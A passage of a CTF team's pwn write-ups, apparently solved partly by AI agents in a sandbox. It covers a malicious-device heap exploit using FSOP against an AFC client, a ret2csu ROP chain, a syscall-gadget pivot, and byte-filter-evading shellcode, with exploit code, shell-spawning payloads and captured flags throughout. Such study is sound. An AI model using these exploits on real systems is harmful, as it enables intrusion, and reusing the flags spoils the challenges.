> device to the extraction toolkit. Analysts connect the standard reader to pull data — but the
> device is not what it seems. Something on the wire is lying.
>
> Walk the vulnerable AFC client on your assigned instance, read the flag off the socket. One
> port, inbound only. Interact only with your assigned instance.

The handout is a small AFC (Apple File Conduit) client, `client`, built against the shipped
`libimobiledevice-1.0.so.6` and `libplist-2.0.so.4`, with glibc 2.39 (Ubuntu 24.04). `handler.sh`
runs the client under `socat` with our inbound TCP socket as its stdin, and the client `dup`s that
socket into its AFC transport. So the roles are inverted from a normal pwn: **we are the iOS
device**. The program under attack is the reader, and every AFC reply it parses comes from us. The
exploit is therefore a malicious AFC peer, not a payload sent to a parser we control.

Static triage of `client`: PIE, full RELRO, stack canary, NX, not stripped, ships with debug info.
It imports only a handful of AFC calls (device info `0xB`, read dir `0x3`, get file info `0xA`,
file open `0xD`, file read `0xF`, file close `0x14`) plus `malloc`/`free`/`memcpy`. The attack
surface is entirely how it handles the replies we send to those calls.

**Approach / walkthrough**

The full exploit is the malicious-peer harness in `workspace/9164-phantom-device/exploit.py`
(`python3 exploit.py HOST PORT` remote; `python3 exploit.py` local, spawning `client` against a
listener on 127.0.0.1:31337 inside `csctf-pwn:1`). It speaks the AFC framing directly. A `Peer`
class scans the inbound byte stream for valid AFC request headers (the client's stdout text and its
AFC requests share one socket, so the harness locates each header by magic and sane length fields),
and a fixed `ops` map says which AFC operation each of the 14 scripted requests will be — read-dir
and info calls early, then the file-open/read/close cycle that carries the heap work.

*AFC framing.* Each packet is a 40-byte header `<8sQQQQ>` = magic `CFA6LPAA`, `entire_length`,
`this_length`, packet `number`, `operation`, followed by a body:

```python
MAGIC = b"CFA6LPAA"
HDR   = struct.Struct("<8sQQQQ")   # magic, entire, this_len, number, operation
```

*The bug — `entire_length` vs `this_length` confusion.* libimobiledevice sizes the receive buffer
from one length field but copies a second, attacker-chosen count into it. `send_packet` weaponizes
exactly that split: it sets `entire = HDR.size + alloc_len` (the size the client mallocs for the
reply) while putting `this_len = HDR.size + len(body)` and sending the *full* `body` on the wire:

```python
def send_packet(sock, number, operation, body=b"", alloc_len=None):
    entire   = HDR.size + alloc_len        # what the client allocates
    this_len = HDR.size + len(body)        # what it then copies
    sock.sendall(HDR.pack(MAGIC, entire, this_len, number, operation) + body)
```

Reply to a file-read with `alloc_len=0x20` but an 0x80-byte body and the client allocates a 0x20
chunk and memcpy's 0x80 bytes into it: a controlled heap overflow of 0x60 bytes past the chunk.

glibc 2.39 has no malloc hooks and uses safe-linked tcache. The chain is therefore: leak a heap
address, defeat safe-linking, poison a tcache entry to get an allocation on a live
`libimobiledevice` object, leak libc, then forge a stdio `FILE` (FSOP) so glibc's own I/O path
makes the controlled call. The flag is read back in-band on the same socket.

1. **Shape the heap.** Requests 1–6 answer benign AFC calls with crafted directory vectors and
   tiny persistent names so the 0x20 and 0x30 tcache bins are drained to a known state and a large
   non-top reply is freed into the unsorted bin as a guard. Concretely, request 2's directory reply
   (`b"a\0b\0c\0d\0\0"`) forces a 0x40 pointer array; request 4's reply is 24 strings of `0x30`
   bytes each, parsed into an unsorted-bin guard that leaves the 0x20/0x30 bins undisturbed; request
   5's four tiny names drain the 0x20 tcache to two entries. This leaves a predictable layout around
   a chunk the harness calls `h1`, with the response chunk itself freed last at a known `0x8f0` head.
2. **Heap leak + safe-link decode.** Request 7's reply body (a freed chunk re-read) carries a
   safe-linked tcache `next` whose low byte the overflow had zeroed. `solve_heap()` brute-forces
   the 256 possible low bytes and the 16-round safe-link fixed point, constraining the result with
   the known page offset `0x8f0` (`HEAP_OFF`), to recover the real pointer. From `h1` the harness
   derives every object: `service_chunk = h1 - 0x5C0`, `afc = h1 - 0x5A0`,
   `connection = h1 - 0x5F0`, `original_packet = h1 - 0x550`.
3. **Overflow + tcache poison.** Reply 7 (`alloc_len=0x20`, 0x80-byte body) rewrites two live 0x20
   chunk headers (forged as `0,0x21` at body offsets 0x20 and 0x40), forges `h1` as a 0x30 chunk
   (`0,0x31` at 0x60), and overwrites its safe-linked `next` at offset 0x70 with
   `service_chunk ^ (h1 >> 12)`:

   ```python
   struct.pack_into("<Q", overflow, 0x70, service_chunk ^ (h1 >> 12))
   send_packet(sock, 7, AFC_DATA, bytes(overflow), alloc_len=0x20)
   ```

   Two allocations later the poisoned chunk is handed out *on top of the real `service_client`
   object*. Overflowing that allocation rewrites the adjacent `afc_client` pointers (connection,
   a one-field fake `service_client` at `service_chunk+0x10`, and the packet pointer) via
   `build_afc_short()`, while the intervening `free()` only clobbers the now-obsolete service copy.
4. **Arbitrary read → libc leak.** With the AFC packet pointer under our control, each subsequent
   reply is read back from an address we choose (the harness re-points `fake_service`'s packet field
   per request). Pointing it at the unsorted-bin guard leaks `main_arena`'s `bk`;
   `libc_base = arena_ptr - 0x204B20`. A page-offset check selects the correct arena offset
   (`0x204B20` when `arena_ptr & 0xfff == 0xB20`, else `0x204F30` when `0xF30`) for the live binary,
   giving the true base.
5. **Leak the locked mutex owner.** FSOP on 2.39 needs the PID that currently holds the AFC mutex
   so the forged `FILE`'s `_lock` looks owned. Reading `afc+0x20` leaks the `pthread_mutex_t`
   owner word; `pid = owner & 0xffffffff`. `mutex_bytes(pid)` rebuilds a valid locked mutex
   (`struct.pack("<IIiIihhQQ", 1, 0, pid, 1, …)`) so the overwrite doesn't deadlock.
6. **FSOP via the wide-vtable (House of Apple).** `build_afc_overlap()` allocates a 0x478 body on
   the real service chunk, preserves the surrounding chunk headers (`connection,0x61` at 0x10,
   `0,0x441` at 0x60) and the live mutex (`mutex_bytes(pid)` at 0x38), and forges a
   `FILE` at `original_packet` (body offset `0x70`): `_mode = 1` (wide) at `+0xC0`, `_wide_data`
   at `+0xA0` and a wide vtable at `+0xD8` pointing at `_IO_wfile_jumps` so that flushing drives
   `_IO_wdoallocbuf`, and `vtable+0x68 = system`. The command sits in the first FILE bytes:

   ```python
   command = b"  cat /flag.txt >&0;\0"     # >&0 writes to the bidirectional socket
   ...
   struct.pack_into("<Q", out, packet_off + 0x200 + 0x68, system_addr)   # wide vtable -> system
   ```

   The AFC packet pointer is finally aimed at `_IO_list_all - 0x28` so the forged structure is
   linked in, and the next flush calls `system("  cat /flag.txt >&0;")`. The `>&0` redirect writes
   to fd 0 — the same bidirectional socket socat left on stdin — so the flag comes straight back to
   us. The harness then drains the socket (3-second timeout) and prints it.

Offsets used (from the shipped libc 2.39, hardcoded in `exploit.py`): unsorted `bk` `0x204B20`,
`system` `0x58750`, `_IO_wfile_jumps` `0x203228`, `_IO_list_all` `0x2054C0`, `environ` `0x20BD58`.

**Why it works**

The client trusts the device completely. A malicious device controls both the contents and the
sizes of what the reader puts on its heap, and the `entire_length`/`this_length` split in the AFC
transport turns that into a direct, sized heap overflow. Modern glibc removed the one-write malloc
hooks, but tcache poisoning still yields an allocation at a chosen address once a heap leak defeats
safe-linking, and a forged stdio `FILE` remains the standard way to convert one controlled heap
object into a call during normal I/O. Because socat keeps the socket bidirectional on stdin, the
shell command can exfiltrate the flag in-band with `>&0` — no outbound connection is needed, which
matters since container egress was blocked.

**Validation / reproduction**

The exploit was developed and detonated only inside the `csctf-pwn:1` Docker sandbox against the
shipped `ld`/`libc`/`libimobiledevice`/`libplist` (local mode spawns `client` behind a listener,
with optional `GDB`/`TRACE`/`PROBE`/`STACK_SCAN` env hooks and the `mtrace.so`/`trace.gdb` shims
for malloc tracing). It was then run once against our assigned instance (`exploit.py <instance>`),
which returned `CSCTF{935QoKmYNLOtHVt0iZ1XtDgM}` in-band. Codex (which built the fake-device
dialogue under guidance) never submits; we verified the value and submitted it once by hand through
the CLI, where it was accepted on the first try (`tried.json`: one attempt, `correct`).

Reproduction summary: build/mount the challenge files at `/challenge` in `csctf-pwn:1`, confirm the
local run drops the flag file to the socket, then point the harness at a fresh instance. Gotchas:
the safe-link low byte must be brute-forced (`solve_heap`) because the overflow zeroes it; the
arena page offset differs per build and is auto-selected; and the forged mutex must carry the live
owner PID or the final flush deadlocks instead of calling `system`.

### relic

> Pwn · Medium · Iulian Schifirnet  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

`CSCTF{ktq2F5bP6RjmWhr0YvpQblII}`

**Challenge**

> An old control unit recovered from a decommissioned Ash Army vault, older than the system software now
> running on it. It accepts one deposit and seals itself for good. One deposit is all you are given; make it
> count, work the unit apart from the inside with the few parts it still trusts, and bring up a prompt of
> your own.

relic is a TCP service in a per-team container, reachable at `<instance>`. The handout `relic.tar.gz` ships
the full source `relic.c`, the `relic` ELF (x86-64, dynamically linked, not stripped), and the matching
loader and `libc.so.6` — `GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.18)`, plus `ld-linux-x86-64.so.2`. The
source header comment literally says `// relic - ret2csu` and records the build line
`gcc -O0 -fno-stack-protector -no-pie -Wl,-z,relro,-z,now` (Ubuntu 20.04), so the real `__libc_csu_init` is
linked in. The briefing's "the few parts it still trusts" is the binary's own code, and "older than the
system software" points at the glibc 2.31 `__libc_csu_init` — the technique is named for anyone who reads
closely.

Tools used: pwntools and the `csctf-pwn` Docker image with the shipped loader and libc 2.31.

**Approach / walkthrough**

Checksec on `relic` (pwntools):

| Mitigation | State |
| --- | --- |
| RELRO | Full |
| Stack canary | none |
| NX | enabled |
| PIE | no (base 0x400000) |

SHSTK/IBT are marked enabled in the ELF, but the CPU and kernel in the container do not enforce them, so
they do not affect the chain. GOT entries are fixed (non-PIE): `_exit` `0x403fd0`, `write` `0x403fd8`,
`alarm` `0x403fe0`, `read` `0x403fe8` (followed by `__libc_start_main` `0x403ff0`, `__gmon_start__`
`0x403ff8`).

1. **The bug.** `vault()` reads far past its buffer:

   ```c
   static void vault(void) {
       char buf[0x40];
       if (visited++) { say("The vault only opens once.\n"); _exit(1); }
       say("Leave something in the vault: ");
       read(0, buf, 0x120);
       say("\n");
   }
   ```

   `read` takes `0x120` bytes into a `0x40`-byte buffer with no canary — a plain stack overflow. `buf` sits
   at `rbp-0x40`, so the saved RIP is at offset `0x48` and there is room for `(0x120 - 0x48)/8 = 27` qwords
   of ROP after it (the chain used is 24). The `visited` guard means `vault()` runs only once, so you cannot
   return into it for a second overflow — the brief's "one deposit".

2. **No argument gadgets.** The binary is tiny and (apart from startup) imports only `write`, `read`,
   `alarm`, `_exit`; it has no `pop rdi`/`pop rsi`/`pop rdx` gadgets of its own. The standard answer, named
   in the source, is **ret2csu**: `__libc_csu_init` carries a universal "call a GOT function with three
   controlled arguments" primitive. Two gadgets, re-disassembled from the handout and matching the exploit:

   - `0x4012da`: `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`
   - `0x4012c0`: `mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]`

   With `rbx=0, rbp=1`, the loop body's trailing `add rbx,1; cmp rbp,rbx; jne` falls through into
   `add rsp,8` plus the six pops again, so each call costs one 8-qword frame and the gadgets chain into one
   another. Setting `r15` to a GOT slot, `rbx=0` makes `call [r15+rbx*8]` call that import; `r12/r13/r14`
   become `edi/rsi/rdx`.

3. **Stage layout and pivot.** Because `vault()` cannot be re-entered, the solve forges a stack at a fixed
   writable address `STAGE = 0x404800` and uses `vault()`'s own `leave; ret` epilogue at `0x401218` to pivot
   there, turning the single `read` into two stages. `0x404800` is not inside `.bss` proper (`.bss` is
   `0x404010`–`0x404018`) but lies in the same RW `PT_LOAD` page `0x404000`–`0x404fff`, which the kernel maps
   writable; with no PIE the address is fixed. The overflow is `'A'*0x40`, the saved-RBP slot set to `STAGE`,
   then a 24-qword csu chain (the overwritten saved RBP does not drive the pivot — the first csu pop
   immediately replaces `rbp` with `1`):

   ```python
   G1, G2, LEAVE = 0x4012da, 0x4012c0, 0x401218
   GOT_EXIT, GOT_WRITE, GOT_READ = 0x403fd0, 0x403fd8, 0x403fe8
   STAGE = 0x404800
   chain = [G1, 0, 1, 1, GOT_EXIT, 0x20, GOT_WRITE, G2,   # write(1, 0x403fd0, 0x20)
            0, 0, 1, 0, STAGE, 0x200, GOT_READ, G2,       # read(0, STAGE, 0x200)
            0, 0, STAGE, 0, 0, 0, 0, LEAVE]               # pop rbp=STAGE; leave;ret -> pivot
   p = b'A'*0x40 + p64(STAGE) + flat(chain)
   p = p.ljust(0x120, b'\0')
   ```

   Reading the first csu frame: `rbx=0, rbp=1, r12=1, r13=GOT_EXIT, r14=0x20, r15=GOT_WRITE`. `call
   [GOT_WRITE]` is `write`; its args are `edi=r12d=1`, `rsi=r13=0x403fd0`, `rdx=r14=0x20`. The second frame
   is `r12=0, r13=STAGE, r14=0x200, r15=GOT_READ` → `read(0, STAGE, 0x200)`.

4. **Leak.** The first csu frame calls `write(1, 0x403fd0, 0x20)`, dumping the four resolved GOT pointers
   (`_exit`, `write`, `alarm`, `read`). Subtracting the handout libc's `write` offset gives the libc base;
   the base recomputed from the `read` pointer is printed alongside as an eyeball cross-check:

   ```python
   ex, wr, al, rd = [u64(leak[i:i+8]) for i in range(0, 32, 8)]
   base = wr - libc.sym['write']
   libc.address = base   # read-leak base printed for comparison
   ```

5. **Second read + pivot.** The second csu frame calls `read(0, STAGE, 0x200)` to receive stage 2 into the
   forged page. The final csu pop frame sets `rbp = STAGE` and returns to `leave; ret`, so `rsp = STAGE`,
   `pop rbp` eats stage 2's first (dummy) qword, and `ret` enters stage 2 at `STAGE+8`.

6. **Stage 2 — shell.** With libc known, a short libc ROP calls `execve("/bin/sh", 0, 0)` using gadgets and
   the `/bin/sh` string from the handout libc:

   ```python
   r = ROP(libc); binsh = next(libc.search(b'/bin/sh\0'))
   s2 = flat([0, r.find_gadget(['pop rdi','ret'])[0], binsh,
              r.find_gadget(['pop rsi','ret'])[0], 0,
              r.find_gadget(['pop rdx','pop r12','ret'])[0], 0, 0,
              libc.sym['execve']])
   io.send(s2.ljust(0x200, b'\0'))
   ```

   The leading `0` is the dummy qword eaten by `pop rbp` during the pivot. The shell line then runs `id` and
   `cat`s several candidate flag paths (`/flag*`, `/home/*/flag*`, `/app/flag*`, `/srv/flag*`), returning the
   flag.

**Why it works**

The overflow plus no canary gives control of the instruction pointer, but a single input with no argument
gadgets would normally block a leak followed by a second stage. `__libc_csu_init` is a universal
three-argument call gadget present in every older GCC/glibc binary, and it supplies both halves of the
problem: the leak (`write` of the GOT) and the second input channel (`read` into a fixed writable page). The
forged saved `rbp` turns the function's own `leave` into the pivot onto stage 2. Full RELRO is irrelevant —
the GOT is only read, never overwritten.

**Validation / reproduction**

The chain was tested in the `csctf-pwn:1` image (`--platform linux/amd64`, `--network none`) against the
handout under its shipped loader and libc. It leaked `_exit`/`write`/`alarm`/`read`, produced a page-aligned
libc base matching the base recomputed from the `read` leak, and opened a shell (`uid=0(root)`); the handout
files have to be copied with the execute bit set first. It was then fired once at the team's assigned
instance, and the flag was submitted once and accepted on the first try (`tried.json`: 1 attempt,
`correct`).

Reproduce with `workspace/9138-relic/exploit.py`:
`docker run --platform linux/amd64 -v <handout>:/w -v <solve>:/s csctf-pwn:1 python3 /s/exploit.py HOST PORT`
(omit HOST/PORT to run locally against `/w` via the shipped loader). Gotchas: the automatic libc-mismatch
check in the script is gated off (`... and False`), so the base agreement is confirmed by eye; the exact
flag-file path inside the container was not saved, which is why the script sweeps several candidate paths.

### sigil

> Pwn · Hard · Iulian Schifirnet  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

`CSCTF{mSlzJEgseYmwJfDZT7l2uzwb}` — a per-instance random flag (`flag_mode: random`, 24-char body). If a
value is rejected, re-run the exploit against a fresh instance for its current flag.

**Challenge**

> A stripped-down checkpoint post the Ash Army left running with no standard library behind it, nothing but
> raw requests to the kernel, which trusts whatever frame you lay in front of it. Speak the right sequence,
> convince the kernel to restore a state of your making, and step through with a prompt in hand.

A TCP service at `<instance>`. The handout `sigil.tar.gz` holds `sigil` (ELF64 x86-64, statically linked,
not stripped) and its source `sigil.c`. Build line from the header:
`gcc -O0 -fno-stack-protector -fcf-protection=none -nostdlib -static -no-pie -o sigil sigil.c`. So: non-PIE
(fixed addresses at `0x40xxxx`), static, no libc, no canary, NX. The description is a direct hint: "no
standard library" (`-nostdlib`), "raw requests to the kernel" (direct syscalls), and "convince the kernel to
restore a state of your making" signposts SROP (Sigreturn-Oriented Programming). A syscall-only ret2 is
simpler and is the route taken; the intended SROP path works through the same gadget.

Tools used: pwntools and objdump; testing in the `csctf-pwn` Docker image with networking off.

**Approach / walkthrough**

The binary is three functions and raw `syscall` wrappers:

```c
static long sys3(long nr, long a, long b, long c) {
    long ret;
    __asm__ volatile ("syscall"
                      : "=a"(ret) : "a"(nr), "D"(a), "S"(b), "d"(c)
                      : "rcx", "r11", "memory");
    return ret;
}
static void listen(void) {
    char buf[0x40];
    attempts++;
    say("speak the sigil: ");
    sys3(SYS_read, 0, (long)buf, 0x400);   // 0x400 read into a 0x40 buffer
}
void _start(void) {
    sys3(SYS_alarm, 60, 0, 0);
    say("~~ sigil ~~\nthe kernel remembers every frame you show it.\n");
    listen();
    say("silence.\n");
    sys3(SYS_exit, 0, 0, 0);
}
```

Addresses from disassembly: `sys3` `0x401000`, `listen` `0x401030`, `_start` `0x401086`, the syscall gadget
`0x401014`, the re-read body `0x401068`, RW `LOAD` at `0x404000`. An `alarm(60)` bounds each session.

1. **The bug.** `listen()` reads `0x400` bytes into a `0x40` buffer — a plain overflow. No canary, no PIE,
   so it reaches saved `rbp` and the return address directly. In `listen`'s frame `buf` is at `rbp-0x40`,
   saved `rbp` at `rbp+0x00`, saved RIP at `rbp+0x08`; the overflow needs `0x40` filler, then a controlled
   `rbp`, then a controlled return.

2. **`sys3` is a syscall-from-memory gadget.** Because the build is `-O0`, `sys3` spills its four arguments
   to the stack and reloads them into the syscall registers right before `syscall`:

   ```
   401004:  mov [rbp-0x18], rdi      ; nr spilled
   401008:  mov [rbp-0x20], rsi      ; a
   40100c:  mov [rbp-0x28], rdx      ; b
   401010:  mov [rbp-0x30], rcx      ; c
   401014:  mov rax,[rbp-0x18]       ; <-- GADGET ENTRY
   401018:  mov rdi,[rbp-0x20]
   40101c:  mov rsi,[rbp-0x28]
   401020:  mov rdx,[rbp-0x30]
   401024:  syscall
   ```

   Entering at `0x401014` is a complete "`syscall(rax,rdi,rsi,rdx)` with every register taken from memory
   under `rbp`" primitive. Control `rbp` and the memory around it and you can issue `execve("/bin/sh", 0, 0)`
   (syscall 59). SROP is not even needed — but the alternative is `rax=15` in the frame followed by a
   `SigreturnFrame`, which the same gadget would execute.

3. **Where to stage.** The RW `LOAD` segment is at vaddr `0x404000` (only `attempts`, 8 bytes of memsz) but
   is page-aligned, so the kernel maps the whole `0x404000`–`0x405000` page RW. With no PIE that is a fixed
   scratch region. Fixed addresses used: anchor `B = 0x404800`, the re-read body `READ_AGAIN = 0x401068`
   (`lea rax,[rbp-0x40]; read(0, rax, 0x400)`), and `SYSCALL_GADGET = 0x401014`.

4. **Stage 1 — pivot and re-read.** Overflow so saved `rbp` becomes `B` and the return goes back into the
   read body:

   ```python
   B = 0x404800; READ_AGAIN = 0x401068; SYSCALL_GADGET = 0x401014
   payload1 = b'A'*0x40 + p64(B) + p64(READ_AGAIN)
   ```

   `listen`'s `leave; ret` sets `rbp = B` and returns to `0x401068`, which runs `read(0, rbp-0x40, 0x400)` =
   `read(0, B-0x40, 0x400)`, placing stage 2 into the data page at `0x4047c0` (the `0x400`-byte read lands at
   `0x4047c0`–`0x404bc0`, inside the mapped page). Only `rbp` was pivoted, not `rsp`, so the nested
   `call sys3` still runs on the real stack; the second `leave; ret` then sets `rsp = B`, pops `rbp = [B]`,
   and returns to `[B+8]`.

5. **Stage 2 — lay the syscall frame at `B-0x40`.** Slots addressed relative to `rbp = B`:

   | Address | Value | Role |
   | --- | --- | --- |
   | `B-0x40` | `"/bin/sh\0"` | `execve` path |
   | `B-0x30` | `0` | `rdx` (envp) |
   | `B-0x28` | `0` | `rsi` (argv) |
   | `B-0x20` | `B-0x40` | `rdi` (path pointer) |
   | `B-0x18` | `59` | `rax` (`SYS_execve`) |
   | `B+0x00` | `B` | saved `rbp` consumed by `leave` |
   | `B+0x08` | `0x401014` | return → gadget |

   In the script this is one `flat(...)` keyed at offsets `0x00, 0x10, 0x18, 0x20, 0x28, 0x40, 0x48` from
   `B-0x40`. The second `leave; ret` sets `rbp = B` and returns to `0x401014`, which loads the slots and
   issues `execve("/bin/sh", 0, 0)` — a shell.

6. **Timing.** A ~0.5 s pause between the two sends keeps them in separate TCP segments. Otherwise the first
   `read(0, buf, 0x400)` swallows the stage-2 bytes onto the real stack, leaving the pivoted second read with
   nothing to place at `B-0x40`. The script then drives the shell with `id; cat /flag* ...; ls /`.

**Why it works**

With no libc and no ASLR on the binary, every address is fixed. An unoptimized (`-O0`) syscall wrapper
spills then reloads its arguments, so it is a ready-made "syscall with memory-sourced registers" gadget once
`rbp` is attacker-controlled. Re-entering `listen`'s own `read` with a moved frame pointer gives a second
write to known memory, so no leak is needed; `-nostdlib -static -no-pie` guarantees the fixed, writable
scratch page the whole thing stages into. A short buffer with a long `read` length is the entire bug;
everything else is plumbing.

**Validation / reproduction**

Built and detonated locally in `csctf-pwn:1` (`--network none`) against a planted test flag first — the
shell opened and `cat /flag*` printed the planted value. All addresses, frame offsets, and gadget semantics
were re-confirmed by disassembling the shipped binary (`sys3` `0x401000`, `listen` `0x401030`, `_start`
`0x401086`, gadget `0x401014`, re-read body `0x401068`, RW `LOAD` at `0x404000`). It then ran unchanged
against the assigned instance: shell as `uid=10001(ctf)`, `cat /flag` printed the flag (root listing also
shows `/serve.py` and `/sigil`). A parallel Codex task failed at launch (`.codex_log.jsonl`: "Daybreak is
unavailable") and added nothing; the solve came entirely from the Claude solver subagent. The flag was
submitted once and accepted (`tried.json`: single attempt, `correct`).

Reproduce: `.venv/bin/python workspace/9139-sigil/solve/exploit.py <HOST> <PORT>` (or
`exploit.py local ./sigil` inside the sandbox). Gotcha: keep the inter-stage pause, and because the flag is
per-instance random, a reject means re-running against a fresh instance, not reshaping the value.

### stepper

> Pwn · Hard · Iulian Schifirnet  
> Points: 609 · Flag submitted by: secretNinja

**The flag**

`CSCTF{oksnCvGpuhCWPIbyqs7zACHI}`

**Challenge**

> A constrained execution bay the Ash Army used to vet captured payloads before trusting them. Your code runs
> one tiny step at a time; the registers carry over between steps, the instruction slot does not, and a short
> list of bytes is turned away at the door. Smuggle a working payload past the gate one step at a time, then
> let it run.

A TCP service (one container per team) at `<instance>`. The handout `stepper.tar.gz` contains the full
source `stepper.c` and the binary `stepper` (ELF64 x86-64 PIE, not stripped;
`-O0 -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now`). The solve was accepted about 27 minutes
after Wave 2 opened.

Tools used: pwntools (its assembler) for the shellcode. Everything else came from reading `stepper.c`.

**Approach / walkthrough**

How the bay works, from `stepper.c`:

- `main` maps one **RWX** page `code` (filled with `0xf4` `hlt`) and one RW guest-stack page.
- The slot layout is `[8 bytes of player code][ff 25 00 00 00 00 = jmp [rip+0]][&guest_exit]`, occupying
  `code[0x00..0x15]`.
- Up to `MAX_STEPS = 12` steps. Each step reads a decimal length (`STEP_SIZE = 6`; >6 is fatal, ≤0 ends the
  loop) then exactly that many raw bytes.
- Every byte is checked against a ban list: `0x0f`, `0x05`, `0x34`, `0xcd` — the bytes of `syscall`
  (`0f 05`), `sysenter` (`0f 34`) and `int` (`cd`), so no syscall instruction can be sent directly.
- Before each step only `code[0:8]` is reset to `0x90` (`nop`) and the chunk copied in. `run_step` loads the
  guest register file `ctx[16]` (RSP included) and jumps into the slot; the trailing `jmp [rip+0]` lands in
  `guest_exit`, which saves every register back to `ctx`.

So what carries over is the **registers** (all 16 GPRs incl. RSP) and **everything in the RWX page outside
`code[0:8]`**. That second point is the weakness: the service says the instruction slot does not survive, but
nothing else in the page is ever reset.

**Key insight.** The ban list applies only to bytes we transmit, not to bytes the guest writes at run time.
Build `0x050f` in a register from allowed bytes, store it at a page offset that is never cleared (and past
the trampoline), and on the last step jump there — running a `syscall` that was never sent over the wire.

Constraints that shape the chain:

1. **No known address** (PIE + mmap). `call $+5; pop rbx` (`e8 00 00 00 00 5b`) is exactly 6 bytes and
   leaves `rbx = code+5`. RBX persists and becomes the base pointer.
2. **Target offset.** `code+5+0x1b = code+0x20`, past the 8-byte slot (`0x00–0x07`), the `jmp [rip+0]`
   (`0x08–0x0d`) and the `&guest_exit` (`0x0e–0x15`) — so neither cleared nor clobbered; `0x1b` is not a
   banned byte.
3. **Making `0x050f` without `0f`/`05`:** `mov ax,0x040e` then `add ax,0x0101`.
4. **Six bytes per step** limits each step to one or two short instructions, so `/bin//sh` is built in
   32-bit halves and combined.

The chain, 11 of the 12 steps (from `solve.py`; every chunk asserted 1–6 bytes, no banned byte):

| # | Bytes | Disassembly | Purpose |
|---|-------|-------------|---------|
| 1 | `e8 00 00 00 00 5b` | `call 5 ; pop rbx` | `rbx = code+5` (position leak) |
| 2 | `31 c0 66 b8 0e 04` | `xor eax,eax ; mov ax,0x40e` | |
| 3 | `66 81 c0 01 01` | `add ax,0x101` | `ax = 0x050f` |
| 4 | `66 89 43 1b` | `mov word [rbx+0x1b], ax` | writes `0f 05` (`syscall`) at `code+0x20` |
| 5 | `b8 2f 62 69 6e` | `mov eax,0x6e69622f` | `"/bin"` |
| 6 | `b9 2f 2f 73 68` | `mov ecx,0x68732f2f` | `"//sh"` |
| 7 | `48 c1 e1 20` | `shl rcx,0x20` | |
| 8 | `48 09 c8 50` | `or rax,rcx ; push rax` | `"/bin//sh"` on the guest stack |
| 9 | `48 89 e7 31 f6` | `mov rdi,rsp ; xor esi,esi` | `rdi = path`, argv = NULL |
| 10 | `31 d2 31 c0 b0 3b` | `xor edx,edx ; xor eax,eax ; mov al,0x3b` | envp = NULL, `rax = 59` (execve) |
| 11 | `48 83 c3 1b ff e3` | `add rbx,0x1b ; jmp rbx` | jump to `code+0x20`, runs `syscall` |

Step by step: step 1 pins a base register despite PIE (`call` pushes the return address `code+5`, `pop rbx`
takes it). Steps 2–4 synthesize the `syscall` opcode in a register and store it past the trampoline, so the
banned bytes only ever exist in the page, never on the wire. Steps 5–8 assemble the little-endian
`0x68732f2f6e69622f` (`"/bin//sh"`) across RAX/RCX and push it. Steps 9–10 set up `execve`'s three
arguments. Step 11 adds `0x1b` to the base and jumps to `code+0x20`, executing the planted `syscall`.

Why the remaining details hold:

- The guest stack is a fresh zero-filled mapping. In step 8 `push rax` writes to `rsp-8` (the same word
  step 1's `call`/`pop` used); the qword at the original RSP is still zero and terminates the string.
- Step 5's `mov eax, imm32` zero-extends into RAX, so step 8's `or` yields exactly
  `0x68732f2f6e69622f` (little-endian `"/bin//sh"`).
- Linux accepts `execve(path, NULL, NULL)`. After a successful `execve` the trampoline never runs again; the
  process image is `/bin/sh`, reading from the same socket.

The service protocol is `length> ` → decimal length + `\n` → `code> ` → raw bytes, repeated per step. After
step 11 the exploit sends `cat /flag /flag.txt ./flag ./flag.txt 2>/dev/null` and the shell prints the flag.

**Why it works**

The filter checks only the bytes we send, not the bytes that end up executing, and the page is writable and
executable. The sandbox resets only the instruction slot, not the registers or the rest of the page, so a
program can be spread over many steps; self-modifying code assembled from arithmetic on allowed bytes defeats
any opcode-byte blacklist. The only "leak" needed is `call $+5; pop rbx`, which turns PIE's unknown base into
a known one relative to `code`.

**Validation / reproduction**

Each chunk was checked offline against the service's length limit and byte blacklist before sending (the
script asserts 1–6 bytes and no banned byte per step). The shipped binary could not be run locally — Docker
Desktop's x86 emulation crashed on its guest-stack switch before `main` — so the chain was verified
statically against the source (filter, lengths, slot layout), and the Capstone disassembly above was
re-checked while writing up. It then ran once against the assigned instance and got a shell. The flag went in
once through `ctf.submit.guarded_submit` and was accepted (one attempt, `correct`).

Reproduce:

```bash
STEPPER_HOST=<instance-host> STEPPER_PORT=<instance-port> \
  .venv/bin/python workspace/9140-stepper/solve.py
```

Without `STEPPER_HOST` the script falls back to `process(["/chal/stepper"])` and checks for an
`echo STEPPER_SHELL_OK` marker; that local mode is meant to run only inside the Docker sandbox.


## Reverse engineering

### Carrier Shadow

> Reverse engineering · Not shown · Created by [Balint](https://github.com/Zedpaixd)  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{b3Oz2vgRuhe66X7SaM1B8qhUjfM2hV}
```

**Challenge**

`carrier-shadow` is a 1,337,736-byte stripped x86-64 PIE (SHA-256
`995fd7161d984898e521eb581f93380b11f31e3de342b368519a2221fb192a04`, dynamically linked against
`ld-linux-x86-64.so.2`, BuildID `0dc09925…18aa3c`) that presents itself as a hex utility, "hexkit
1.2.0". Run, it prints a few lines of ordinary hex-dump output. The brief's twist: the usual hiding
spots are all clean — data sections, `strings` output, any overlay past the section table, and
appended archives hold nothing useful — yet the binary's second-stage payload signature was seen in
captured traffic. The task is to find where that payload actually lives, lift it out statically, and
read the authorization string it carries. (The brief calls the second stage a "static ELF"; the
carrier itself is PIE/dynamic. It is the *lifted* stage-2 that is static, an immaterial
brief-vs-artifact wording difference.)

**Approach**

The binary triaged to the reverse lane (`solvers/binary/binfmt.py`, `facts.py`, `static_re.py`,
`native_behavior.py`, plus the `solvers/toolkits/` symbolic engines). The decisive first observation
is the shape of the code: roughly 24,800 tiny "micro-functions." The `.eh_frame_hdr` binary-search
table lists `fde_count = 0x60f0` (24,816) FDEs. That many near-empty functions is not a quirk of the
compiler — it is the whole mechanism. The payload is encoded not in any byte of data, but in *where*
the functions sit.

1. **Find the real `main`.** `_start` (the entry stub at `0x21a0`) hands `0x99160` to
   `__libc_start_main`. `0x99160` is a single `jmp 0x99320`, so the body lives at `0x99320`. In this
   PIE the text segment's file offset equals its vaddr, so the two numbering schemes agree throughout
   and addresses from the disassembler can be used directly as file offsets.

